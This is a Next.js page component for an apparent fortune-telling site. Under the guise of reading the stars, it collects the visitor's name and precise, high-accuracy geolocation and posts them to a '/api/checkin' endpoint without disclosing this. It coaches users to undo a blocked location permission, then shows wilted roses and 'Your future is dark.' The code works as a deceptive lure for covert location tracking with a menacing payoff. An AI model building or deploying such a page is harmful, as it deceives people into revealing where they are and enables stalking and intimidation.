
'use client';

import { useCallback, useState } from 'react';

type Stage = 'idle' | 'scanning' | 'revealed';
type Problem = 'denied' | 'unavailable' | 'timeout' | 'error' | null;

export default function Home() {
  const [name, setName] = useState('');
  const [stage, setStage] = useState<Stage>('idle');
  const [problem, setProblem] = useState<Problem>(null);
  const [imgOk, setImgOk] = useState(true);

  const reveal = useCallback(() => {
    setProblem(null);

    if (!navigator.geolocation) {
      setProblem('unavailable');
      return;
    }

    setStage('scanning');

    navigator.geolocation.getCurrentPosition(
      async ({ coords }) => {
        try {
          const res = await fetch('/api/checkin', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              name,
              lat: coords.latitude,
              lng: coords.longitude,
              accuracy: coords.accuracy,
            }),
          });

          if (!res.ok) throw new Error('Save failed');

          setTimeout(() => setStage('revealed'), 1800);
        } catch {
          setStage('idle');
          setProblem('error');
        }
      },

      (err) => {
        setStage('idle');

        if (err.code === err.PERMISSION_DENIED) {
          setProblem('denied');
        } else if (err.code === err.POSITION_UNAVAILABLE) {
          setProblem('unavailable');
        } else if (err.code === err.TIMEOUT) {
          setProblem('timeout');
        } else {
          setProblem('error');
        }
      },

      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  }, [name]);

  return (
    <main className="stage">
      <div className="orb orb-a" />
      <div className="orb orb-b" />

      <section className="card">

        {/* INITIAL SCREEN */}
        {stage === 'idle' && (
          <>
            <div className="crystal">🔮</div>

            <h1>Know Your Fortune</h1>

            <p className="sub">
              The stars are ready to speak. Are you?
            </p>

            <input
              className="input"
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="Enter your name"
              maxLength={50}
            />

            <button className="btn" onClick={reveal}>
              Reveal my future
            </button>
          </>
        )}

        {/* SCANNING SCREEN */}
        {stage === 'scanning' && (
          <>
            <div className="radar">
              <span />
              <span />
              <span />

              <div className="crystal small">🔮</div>
            </div>

            <h1>Reading the stars…</h1>

            <p className="sub">
              Please hold still
            </p>
          </>
        )}

        {/* REVEALED SCREEN */}
        {stage === 'revealed' && (
          <div className="reveal">
            <div className="flowers">
              {imgOk ? (
                // eslint-disable-next-line @next/next/no-img-element
                <img
                  src="/flowers.jpg"
                  alt="Flowers"
                  onError={() => setImgOk(false)}
                />
              ) : (
                <div className="emoji-flowers">
                  🥀🌹🥀
                </div>
              )}
            </div>

            <h1 className="dark-text">
              Your future is dark.
            </h1>

  
          </div>
        )}
      </section>

      {/* LOCATION PERMISSION MODAL */}
      {problem && (
        <div className="overlay">
          <div
            className="modal"
            role="dialog"
            aria-modal="true"
          >
            {problem === 'denied' ? (
              <>
                <div className="modal-icon">🔒</div>

                <h2>Location access required</h2>

                <p className="modal-text">
                  Your browser has blocked location access.
                  Enable it to reveal your fortune.
                </p>

                <div className="permission-help">
                  <div className="help-title">
                    Quick instructions
                  </div>

                  <ol className="modal-steps">
                    <li>
                      Click the settings icon next to
                      your website address.
                    </li>

                    <li>
                      Find Location and click
                      Reset permission or change it to Allow.
                    </li>

                    <li>
                      Return here and click Continue.
                    </li>
                  </ol>
                </div>

                <div className="modal-actions">
                  <button
                    className="btn"
                    onClick={reveal}
                  >
                    Continue →
                  </button>
                </div>

                <p className="tiny">
                  Reset the blocked permission before continuing.
                </p>
              </>
            ) : (
              <>
                <div className="modal-icon">
                  {problem === 'timeout'
                    ? '⏳'
                    : problem === 'unavailable'
                      ? '📡'
                      : '⚠️'}
                </div>

                <h2>
                  {problem === 'timeout'
                    ? 'Location timed out'
                    : problem === 'unavailable'
                      ? "Can't detect your location"
                      : 'Something went wrong'}
                </h2>

                <p className="modal-text">
                  {problem === 'timeout'
                    ? "We couldn't get your location in time. Please try again."
                    : problem === 'unavailable'
                      ? 'Please turn on Location services on your device and try again.'
                      : 'We could not complete your request. Please try again.'}
                </p>

                <div className="modal-actions">
                  <button className="btn" onClick={reveal}>
                    Try again
                  </button>

                  <button
                    className="btn-ghost"
                    onClick={() => setProblem(null)}
                  >
                    Close
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </main>
  );
}
